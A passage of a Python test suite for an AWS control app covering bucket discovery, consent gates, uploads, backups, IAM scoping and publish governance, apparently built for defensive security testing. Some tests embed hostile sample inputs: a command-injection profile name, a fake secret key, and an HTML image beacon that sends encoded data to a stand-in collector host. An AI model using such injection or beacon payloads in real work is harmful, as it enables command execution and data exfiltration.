            with pytest.raises(AWSError, match="ambiguous"):
                storage.find_drive("p", "us-east-1", account="111122223333")

    def test_find_drive_ignores_foreign_naming(self):
        from kiro_crew.apps.builtins.aws_control.backend import storage

        # Round-10 pin: neither an unrelated name NOR a bucket that merely
        # STARTS with our prefix ("kirocrew-drive-company-data") is adopted --
        # only the complete prefix+12-hex scheme new_bucket_name() produces.
        payload = json.dumps(
            {
                "ResourceTagMappingList": [
                    {"ResourceARN": "arn:aws:s3:::stolen-tag-bucket"},
                    {"ResourceARN": "arn:aws:s3:::kirocrew-drive-company-data"},
                    {"ResourceARN": "arn:aws:s3:::kirocrew-drive-0123456789ab"},
                ]
            }
        )
        with (
            mock.patch.object(storage, "_checked", return_value=payload),
            # The naming scheme is what this pins; the owner probe that now runs on
            # the survivor is stubbed as confirming, so a failure here means the
            # name filter changed rather than the ownership check.
            mock.patch.object(storage.engine, "run_aws", return_value=(0, "", "")),
        ):
            assert (
                storage.find_drive("p", "us-east-1", account="111122223333")
                == "kirocrew-drive-0123456789ab"
            )


# ---------------------------------------------------------------------------
# New-surface guards: consent, confirm gate, restricted sessions, upload cap
# ---------------------------------------------------------------------------


class TestDriveGuards:
    def test_no_bucket_name_cache_exists(self):
        # Discovery is a trust decision: a cached name would outlive an
        # out-of-band delete + hostile re-creation. Pin its absence.
        assert not hasattr(routes_mod, "_bucket_cache")

    def test_consent_refusal_answers_409_before_any_aws_call(self):
        handlers = _registered()
        p1, p2, p3 = _enabled_owner_env()
        with (
            p1,
            p2,
            p3,
            mock.patch.object(
                routes_mod.aws_consent, "refuse_and_log", AsyncMock(return_value=False)
            ),
            mock.patch.object(routes_mod.storage_mod, "find_drive") as find,
        ):
            resp = asyncio.run(
                handlers[("GET", "/drive/{account}")](  # type: ignore[operator]
                    _request("GET", f"/drive/{ACCOUNT}", match_info={"account": ACCOUNT})
                )
            )
        assert resp.status == 409
        assert _payload(resp)["code"] == "aws_consent_required"
        find.assert_not_called()

    def test_invalid_account_is_a_400_not_a_probe(self):
        handlers = _registered()
        with mock.patch.object(routes_mod, "is_app_enabled", return_value=True):
            resp = asyncio.run(
                handlers[("GET", "/drive/{account}")](  # type: ignore[operator]
                    _request("GET", "/drive/not-an-id", match_info={"account": "not-an-id"})
                )
            )
        assert resp.status == 400
        assert _payload(resp)["code"] == "invalid_account"

    def test_bootstrap_without_confirm_previews_and_creates_nothing(self):
        handlers = _registered()
        p1, p2, p3 = _enabled_owner_env()
        with (
            p1,
            p2,
            p3,
            mock.patch.object(
                routes_mod.aws_consent, "refuse_and_log", AsyncMock(return_value=True)
            ),
            mock.patch.object(routes_mod.storage_mod, "find_drive", return_value=None),
            mock.patch.object(routes_mod.storage_mod, "create_drive") as create,
        ):
            req = _request("POST", f"/drive/{ACCOUNT}/bootstrap", match_info={"account": ACCOUNT})
            req.json = AsyncMock(return_value={})  # type: ignore[method-assign]
            resp = asyncio.run(
                handlers[("POST", "/drive/{account}/bootstrap")](req)  # type: ignore[operator]
            )
        assert resp.status == 200
        assert _payload(resp)["preview"] is True
        create.assert_not_called()

    def test_bootstrap_with_confirm_creates_once(self):
        handlers = _registered()
        p1, p2, p3 = _enabled_owner_env()
        with (
            p1,
            p2,
            p3,
            mock.patch.object(
                routes_mod.aws_consent, "refuse_and_log", AsyncMock(return_value=True)
            ),
            mock.patch.object(routes_mod.storage_mod, "find_drive", return_value=None),
            mock.patch.object(
                routes_mod.storage_mod, "create_drive", return_value="kirocrew-drive-abc"
            ) as create,
        ):
            req = _request("POST", f"/drive/{ACCOUNT}/bootstrap", match_info={"account": ACCOUNT})
            req.json = AsyncMock(return_value={"confirm": True})  # type: ignore[method-assign]
            resp = asyncio.run(
                handlers[("POST", "/drive/{account}/bootstrap")](req)  # type: ignore[operator]
            )
        assert _payload(resp) == {"created": True, "bucket": "kirocrew-drive-abc"}
        create.assert_called_once()

    def test_every_mutation_refuses_a_restricted_session(self):
        handlers = _registered()
        with (
            mock.patch.object(routes_mod, "is_app_enabled", return_value=True),
            mock.patch(
                "kiro_crew.dashboard.handlers._shared._is_restricted_session",
                return_value=True,
            ),
        ):
            for method, path in MUTATIONS:
                concrete = path.replace("{account}", ACCOUNT).replace("{id}", "x")
                info = {}
                if "{account}" in path:
                    info["account"] = ACCOUNT
                if "{id}" in path:
                    info["id"] = "x"
                req = _request(method, concrete, match_info=info)
                req.json = AsyncMock(return_value={})  # type: ignore[method-assign]
                resp = asyncio.run(handlers[(method, path)](req))  # type: ignore[operator]
                assert resp.status == 403, (method, path)
                assert _payload(resp)["code"] == "restricted_session", (method, path)

    def test_upload_over_the_cap_is_refused_by_header(self):
        handlers = _registered()
        p1, p2, p3 = _enabled_owner_env()
        with (
            p1,
            p2,
            p3,
            mock.patch.object(
                routes_mod.aws_consent, "refuse_and_log", AsyncMock(return_value=True)
            ),
            mock.patch.object(
                routes_mod.storage_mod, "find_drive", return_value="kirocrew-drive-abc"
            ),
        ):
            req = _request(
                "POST",
                f"/drive/{ACCOUNT}/upload?section=drive&key=big.bin",
                match_info={"account": ACCOUNT},
                headers={"Content-Length": str(routes_mod._MAX_UPLOAD_BYTES + 1)},
            )
            resp = asyncio.run(
                handlers[("POST", "/drive/{account}/upload")](req)  # type: ignore[operator]
            )
        assert resp.status == 400
        assert _payload(resp)["code"] == "upload_too_large"

    def test_download_urls_are_short_lived(self):
        handlers = _registered()
        p1, p2, p3 = _enabled_owner_env()
        with (
            p1,
            p2,
            p3,
            mock.patch.object(
                routes_mod.aws_consent, "refuse_and_log", AsyncMock(return_value=True)
            ),
            mock.patch.object(
                routes_mod.storage_mod, "find_drive", return_value="kirocrew-drive-abc"
            ),
            mock.patch.object(routes_mod.storage_mod, "head_object_meta", return_value={}),
            mock.patch.object(
                routes_mod.storage_mod, "presign", return_value="https://signed"
            ) as presign,
        ):
            req = _request(
                "GET",
                f"/drive/{ACCOUNT}/download?section=drive&key=a.txt",
                match_info={"account": ACCOUNT},
            )
            resp = asyncio.run(
                handlers[("GET", "/drive/{account}/download")](req)  # type: ignore[operator]
            )
        assert _payload(resp)["expiresSecs"] == routes_mod._DOWNLOAD_URL_SECS
        assert presign.call_args.args[-1] == routes_mod._DOWNLOAD_URL_SECS


# ---------------------------------------------------------------------------
# Costs cache
# ---------------------------------------------------------------------------


class TestCosts:
    @pytest.fixture(autouse=True)
    def _isolated_cache(self, tmp_path, monkeypatch):
        from kiro_crew.apps.builtins.aws_control.backend import costs

        monkeypatch.setattr(costs, "_cache_path", lambda account: tmp_path / f"{account}.json")
        yield

    def test_fetch_parses_groups_and_caches(self):
        from kiro_crew.apps.builtins.aws_control.backend import costs

        ce_payload = json.dumps(
            {
                "ResultsByTime": [
                    {
                        "Groups": [
                            {
                                "Keys": ["Amazon S3"],
                                "Metrics": {"UnblendedCost": {"Amount": "1.25"}},
                            },
                            {"Keys": ["AWS Lambda"], "Metrics": {"UnblendedCost": {"Amount": "0"}}},
                        ]
                    }
                ]
            }
        )
        with mock.patch.object(costs, "_checked", return_value=ce_payload):
            result = costs.fetch_month_costs("p", "us-east-1", ACCOUNT)
        assert result["monthToDate"] == 1.25
        assert result["byService"] == [{"service": "Amazon S3", "amount": 1.25}]
        assert result["projected"] >= result["monthToDate"]
        cached = costs.read_cached(ACCOUNT)
        assert cached is not None and costs.is_fresh(cached)

    def test_stale_cache_is_not_fresh(self):
        from kiro_crew.apps.builtins.aws_control.backend import costs

        assert not costs.is_fresh(None)
        assert not costs.is_fresh({"fetchedAt": "2000-01-01T00:00:00+00:00"})

    def test_costs_endpoint_serves_stale_cache_when_consent_missing(self):
        handlers = _registered()
        stale = {"account": ACCOUNT, "monthToDate": 3.42, "fetchedAt": "2000-01-01T00:00:00+00:00"}
        p1, p2, p3 = _enabled_owner_env()
        with (
            p1,
            p2,
            p3,
            mock.patch.object(routes_mod.costs_mod, "read_cached", return_value=stale),
            mock.patch.object(
                routes_mod.aws_consent, "refuse_and_log", AsyncMock(return_value=False)
            ),
        ):
            resp = asyncio.run(
                handlers[("GET", "/costs/{account}")](  # type: ignore[operator]
                    _request("GET", f"/costs/{ACCOUNT}", match_info={"account": ACCOUNT})
                )
            )
        body = _payload(resp)
        assert body["fresh"] is False and body["consentMissing"] is True
        assert body["monthToDate"] == 3.42


# ---------------------------------------------------------------------------
# Backup
# ---------------------------------------------------------------------------


class TestBackup:
    @pytest.fixture(autouse=True)
    def _isolated_state(self, tmp_path, monkeypatch):
        from kiro_crew.apps.builtins.aws_control.backend import backup

        monkeypatch.setattr(backup, "_state_path", lambda: tmp_path / "backup.json")
        yield

    def test_run_rejects_unknown_kind(self):
        handlers = _registered()
        p1, p2, p3 = _enabled_owner_env()
        with (
            p1,
            p2,
            p3,
            mock.patch.object(
                routes_mod.aws_consent, "refuse_and_log", AsyncMock(return_value=True)
            ),
            mock.patch.object(
                routes_mod.storage_mod, "find_drive", return_value="kirocrew-drive-abc"
            ),
        ):
            req = _request("POST", f"/backup/{ACCOUNT}/run", match_info={"account": ACCOUNT})
            req.json = AsyncMock(return_value={"kind": "everything"})  # type: ignore[method-assign]
            resp = asyncio.run(
                handlers[("POST", "/backup/{account}/run")](req)  # type: ignore[operator]
            )
        assert resp.status == 400
        assert _payload(resp)["code"] == "invalid_kind"

    def test_restore_key_must_name_a_backup_archive(self):
        handlers = _registered()
        p1, p2, p3 = _enabled_owner_env()
        with (
            p1,
            p2,
            p3,
            mock.patch.object(
                routes_mod.aws_consent, "refuse_and_log", AsyncMock(return_value=True)
            ),
            mock.patch.object(
                routes_mod.storage_mod, "find_drive", return_value="kirocrew-drive-abc"
            ),
        ):
            req = _request("POST", f"/backup/{ACCOUNT}/restore", match_info={"account": ACCOUNT})
            req.json = AsyncMock(  # type: ignore[method-assign]
                return_value={"key": "not-a-backup/evil.tar.gz"}
            )
            resp = asyncio.run(
                handlers[("POST", "/backup/{account}/restore")](req)  # type: ignore[operator]
            )
        assert resp.status == 400

    def test_nightly_due_logic(self, tmp_path):
        import datetime as dt

        from kiro_crew.apps.builtins.aws_control.backend import backup

        assert not backup.due_for_nightly(ACCOUNT)  # toggle off
        backup.set_nightly(ACCOUNT, True)
        assert backup.due_for_nightly(ACCOUNT)  # never ran
        backup._record_run(ACCOUNT, backup.KIND_SNAPSHOT, "snapshots/x.tar.gz", 10)
        assert not backup.due_for_nightly(ACCOUNT)  # just ran
        future = dt.datetime.now(dt.timezone.utc) + dt.timedelta(hours=24)
        assert backup.due_for_nightly(ACCOUNT, now=future)  # a day later

    def test_backup_state_is_account_scoped(self, tmp_path):
        # Two accounts must not share a nightly toggle or run records —
        # switching the default account cannot make one console report
        # the other account's backups.
        from kiro_crew.apps.builtins.aws_control.backend import backup

        other = "444455556666"
        backup.set_nightly(ACCOUNT, True)
        backup._record_run(ACCOUNT, backup.KIND_SNAPSHOT, "snapshots/a.tar.gz", 1)
        assert not backup.nightly_enabled(other)
        assert backup.last_runs(other) == {}
        assert backup.last_runs(ACCOUNT)[backup.KIND_SNAPSHOT]["key"] == "snapshots/a.tar.gz"


# ---------------------------------------------------------------------------
# Drive IAM tier
# ---------------------------------------------------------------------------


class TestDriveIamTier:
    def test_drive_tier_is_self_contained_and_scoped(self):
        from kiro_crew.deploy import iam

        doc = iam.policy_document(tier="drive")
        sids = [s["Sid"] for s in doc["Statement"]]
        assert sids == [
            "DriveBucketLevel",
            "DriveObjectLevel",
            "DriveBackupWriteOnly",
            "DriveDiscovery",
            "DriveBill",
        ]
        for statement in doc["Statement"]:
            if statement["Sid"].startswith("DriveBucket") or statement["Sid"].startswith(
                "DriveObject"
            ):
                for arn in statement["Resource"]:
                    # Partition-neutral: the scoping that matters is
                    # the bucket-name pattern, not the commercial partition.
                    assert arn.startswith("arn:*:s3:::kirocrew-drive-"), arn
        # Round-14 pin: the recommended tier can WRITE backups but never read
        # them back -- no GetObject grant may ever reach the backup prefix.
        by_sid = {s["Sid"]: s for s in doc["Statement"]}
        backup = by_sid["DriveBackupWriteOnly"]
        assert backup["Resource"] == ["arn:*:s3:::kirocrew-drive-*/backup/*"]
        assert "s3:GetObject" not in backup["Action"]
        assert "s3:DeleteObject" not in backup["Action"]
        objects = by_sid["DriveObjectLevel"]
        assert objects["Resource"] == [
            "arn:*:s3:::kirocrew-drive-*/drive/*",
            "arn:*:s3:::kirocrew-drive-*/artifacts/*",
        ]
        # No deploy-web statements leak into the drive tier.
        assert not any("kirocrew-web" in json.dumps(s) for s in doc["Statement"])
        assert not any("cloudfront" in json.dumps(s).lower() for s in doc["Statement"])

    def test_static_tier_is_unchanged_by_the_drive_tier(self):
        from kiro_crew.deploy import iam

        doc = iam.policy_document(tier="static")
        assert not any(s["Sid"].startswith("Drive") for s in doc["Statement"])


# ---------------------------------------------------------------------------
# Round-3 hardening pins
# ---------------------------------------------------------------------------


class TestRound3Hardening:
    def test_hostile_profile_name_never_reaches_a_display_command(self):
        # The registry file is agent-writable config; a name written
        # out-of-band must not appear in copy-into-terminal text.
        plan = accounts_mod.reconnect_plan(accounts_mod.KIND_SSO, "x; touch /tmp/pwn")
        assert plan["command"] == ""
        assert plan["kind"] == accounts_mod.KIND_OTHER

    def test_hostile_profile_name_is_not_classified_via_argv(self):
        with mock.patch.object(accounts_mod.engine, "run_aws") as run:
            kind = asyncio.run(accounts_mod.classify_profile("evil name"))
        assert kind == accounts_mod.KIND_OTHER
        run.assert_not_called()

    def test_classification_failure_degrades_one_profile_not_the_listing(self):
        with mock.patch.object(
            accounts_mod.engine, "run_aws", side_effect=FileNotFoundError("no aws")
        ):
            kind = asyncio.run(accounts_mod.classify_profile("fine-profile"))
        assert kind == accounts_mod.KIND_OTHER

    def test_concurrent_bootstrap_confirms_create_exactly_one_drive(self):
        handlers = _registered()
        created: list[str] = []

        def create(profile, region, account):
            created.append(profile)
            return f"kirocrew-drive-{len(created)}"

        # First discovery sees nothing; once created, discovery finds it.
        def find(profile, region, *, account):
            return f"kirocrew-drive-{len(created)}" if created else None

        p1, p2, p3 = _enabled_owner_env()
        with (
            p1,
            p2,
            p3,
            mock.patch.object(
                routes_mod.aws_consent, "refuse_and_log", AsyncMock(return_value=True)
            ),
            mock.patch.object(routes_mod.storage_mod, "find_drive", side_effect=find),
            mock.patch.object(routes_mod.storage_mod, "create_drive", side_effect=create),
        ):

            async def confirm_twice():
                async def one():
                    req = _request(
                        "POST",
                        f"/drive/{ACCOUNT}/bootstrap",
                        match_info={"account": ACCOUNT},
                    )
                    req.json = AsyncMock(return_value={"confirm": True})  # type: ignore[method-assign]
                    return await handlers[("POST", "/drive/{account}/bootstrap")](req)  # type: ignore[operator]

                return await asyncio.gather(one(), one())

            first, second = asyncio.run(confirm_twice())
        assert len(created) == 1
        bodies = [_payload(first), _payload(second)]
        assert any(b.get("created") for b in bodies)
        assert any(b.get("code") == "drive_exists" for b in bodies)

    def test_share_refuses_a_missing_object_and_records_nothing(self):
        handlers = _registered()
        p1, p2, p3 = _enabled_owner_env()
        with (
            p1,
            p2,
            p3,
            mock.patch.object(
                routes_mod.aws_consent, "refuse_and_log", AsyncMock(return_value=True)
            ),
            mock.patch.object(
                routes_mod.storage_mod, "find_drive", return_value="kirocrew-drive-abc"
            ),
            mock.patch.object(routes_mod.storage_mod, "object_exists", return_value=False),
            mock.patch.object(routes_mod.storage_mod, "presign") as presign,
            mock.patch.object(routes_mod.shares_mod, "record_share") as record,
        ):
            req = _request("POST", f"/drive/{ACCOUNT}/share", match_info={"account": ACCOUNT})
            req.json = AsyncMock(  # type: ignore[method-assign]
                return_value={"section": "drive", "key": "ghost.txt"}
            )
            resp = asyncio.run(
                handlers[("POST", "/drive/{account}/share")](req)  # type: ignore[operator]
            )
        assert resp.status == 404
        assert _payload(resp)["code"] == "unknown_object"
        presign.assert_not_called()
        record.assert_not_called()


# ---------------------------------------------------------------------------
# Round-5 pins: publish governance + credential scan on the egress paths
# ---------------------------------------------------------------------------


class TestPublishGovernance:
    def _egress(self, method: str, path: str, info: dict, body: dict):
        handlers = _registered()
        p1, p2, p3 = _enabled_owner_env()
        with (
            p1,
            p2,
            p3,
            mock.patch.object(
                routes_mod.aws_consent, "refuse_and_log", AsyncMock(return_value=True)
            ),
            mock.patch.object(
                routes_mod.storage_mod, "find_drive", return_value="kirocrew-drive-abc"
            ),
            mock.patch.object(
                routes_mod, "publish_denied_reason", return_value="capability denied"
            ),
            mock.patch.object(routes_mod.storage_mod, "presign") as presign,
            mock.patch.object(routes_mod.library_mod, "push_artifact") as push,
        ):
            req = _request(method, path, match_info=info)
            req.json = AsyncMock(return_value=body)  # type: ignore[method-assign]
            resp = asyncio.run(handlers[(method, path.split("?")[0].replace(ACCOUNT, "{account}"))](req))  # type: ignore[operator]
        return resp, presign, push

    def test_library_push_is_denied_by_the_publish_gate(self):
        resp, _presign, push = self._egress(
            "POST", f"/library/{ACCOUNT}/push", {"account": ACCOUNT}, {"slug": "x"}
        )
        assert resp.status == 403
        assert _payload(resp)["code"] == "publish_denied"
        push.assert_not_called()

    def test_share_is_denied_by_the_publish_gate(self):
        resp, presign, _push = self._egress(
            "POST",
            f"/drive/{ACCOUNT}/share",
            {"account": ACCOUNT},
            {"section": "drive", "key": "a.txt"},
        )
        assert resp.status == 403
        assert _payload(resp)["code"] == "publish_denied"
        presign.assert_not_called()

    def test_download_presign_is_denied_by_the_publish_gate(self):
        # Round-8 pin: the download presign mints the same
        # anyone-with-the-URL-can-fetch link as a share, so it sits behind the
        # same fail-closed decision.
        resp, presign, _push = self._egress(
            "GET",
            f"/drive/{ACCOUNT}/download?section=drive&key=a.txt",
            {"account": ACCOUNT},
            {},
        )
        assert resp.status == 403
        assert _payload(resp)["code"] == "publish_denied"
        presign.assert_not_called()


class TestBackupNotShareable:
    def test_download_of_backup_section_is_refused_outright(self):
        # Round-13 pin: the download presign mints the same bearer URL as a
        # share; the backup section is refused on BOTH routes.
        handlers = _registered()
        p1, p2, p3 = _enabled_owner_env()
        with (
            p1,
            p2,
            p3,
            mock.patch.object(
                routes_mod.aws_consent, "refuse_and_log", AsyncMock(return_value=True)
            ),
            mock.patch.object(
                routes_mod.storage_mod, "find_drive", return_value="kirocrew-drive-abc"
            ),
            mock.patch.object(routes_mod, "publish_denied_reason", return_value=""),
            mock.patch.object(routes_mod.storage_mod, "presign") as presign,
        ):
            req = _request(
                "GET",
                f"/drive/{ACCOUNT}/download?section=backup&key=snapshots/x.tar.gz",
                match_info={"account": ACCOUNT},
            )
            resp = asyncio.run(handlers[("GET", "/drive/{account}/download")](req))  # type: ignore[operator]
        assert resp.status == 403
        assert _payload(resp)["code"] == "backup_not_shareable"
        presign.assert_not_called()

    def test_share_of_backup_section_is_refused_outright(self):
        # Round-8 pin: backup archives carry raw gateway state; no share is
        # ever minted for them, independent of the governance verdict.
        handlers = _registered()
        p1, p2, p3 = _enabled_owner_env()
        with (
            p1,
            p2,
            p3,
            mock.patch.object(
                routes_mod.aws_consent, "refuse_and_log", AsyncMock(return_value=True)
            ),
            mock.patch.object(
                routes_mod.storage_mod, "find_drive", return_value="kirocrew-drive-abc"
            ),
            mock.patch.object(routes_mod, "publish_denied_reason", return_value=""),
            mock.patch.object(routes_mod.storage_mod, "presign") as presign,
        ):
            req = _request("POST", f"/drive/{ACCOUNT}/share", match_info={"account": ACCOUNT})
            req.json = AsyncMock(return_value={"section": "backup", "key": "snapshot/x.tar.zst"})  # type: ignore[method-assign]
            resp = asyncio.run(handlers[("POST", "/drive/{account}/share")](req))  # type: ignore[operator]
        assert resp.status == 403
        assert _payload(resp)["code"] == "backup_not_shareable"
        presign.assert_not_called()


class TestLibraryScan:
    def test_credential_bearing_artifact_is_refused(self, tmp_path, monkeypatch):
        from types import SimpleNamespace as NS

        from kiro_crew.apps.builtins.aws_control.backend import library

        monkeypatch.setattr(library, "_ledger_path", lambda: tmp_path / "library.json")
        fake_artifact = NS(
            slug="leaky",
            name="ok",
            kind="text",
            version=1,
            description="",
            tags=[],
            content="aws_secret_access_key = AKIAIOSFODNN7EXAMPLEKEYX",
        )
        with (
            mock.patch.object(library, "get_default_store") as store,
            mock.patch.object(library.storage, "put_file") as put,
        ):
            store.return_value.get.return_value = fake_artifact
            with pytest.raises(ValueError, match="credential-like"):
                library.push_artifact("p", "us-west-2", "b", ACCOUNT, "leaky")
        put.assert_not_called()

    def test_exfiltration_url_bearing_artifact_is_refused(self, tmp_path, monkeypatch):
        # Round-9 pin: an LLM-authored artifact carrying a beacon URL is
        # refused at push, before any byte reaches the bucket.
        from types import SimpleNamespace as NS

        from kiro_crew.apps.builtins.aws_control.backend import library

        monkeypatch.setattr(library, "_ledger_path", lambda: tmp_path / "library.json")
        beacon = (
            "https://collector.example.net/c?d="
            + "aGVsbG8gd29ybGQgdGhpcyBpcyBqdXN0IHBsYWluIHRleHQ" * 3
        )
        fake_artifact = NS(
            slug="beacon",
            name="ok",
            kind="html",
            version=1,
            description="",
            tags=[],
            content=f'<img src="{beacon}">',
        )
        with (
            mock.patch.object(library, "get_default_store") as store,
            mock.patch.object(library.storage, "put_file") as put,
        ):
            store.return_value.get.return_value = fake_artifact
            with pytest.raises(ValueError, match="suspicious external endpoint"):
                library.push_artifact("p", "us-west-2", "b", ACCOUNT, "beacon")
        put.assert_not_called()
